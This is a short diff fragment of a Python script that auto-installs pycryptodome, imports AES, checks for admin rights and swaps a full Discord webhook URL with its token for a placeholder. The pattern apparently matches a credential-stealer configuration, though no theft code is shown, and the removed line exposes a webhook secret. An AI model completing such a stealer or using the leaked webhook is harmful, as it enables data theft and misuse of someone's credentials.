@@ -22,7 +22,7 @@ except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
     from Crypto.Cipher import AES
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1399868638218948709/x0VBJgBgWLJQrOByqOC4Xk_OZ0EsN4FKxH3aYs-MYamYTFrBCK21IAcdSGyImeFOIieo"
+WEBHOOK_URL = "Your_webhook_here"
 
 # Admin check
 def is_admin():
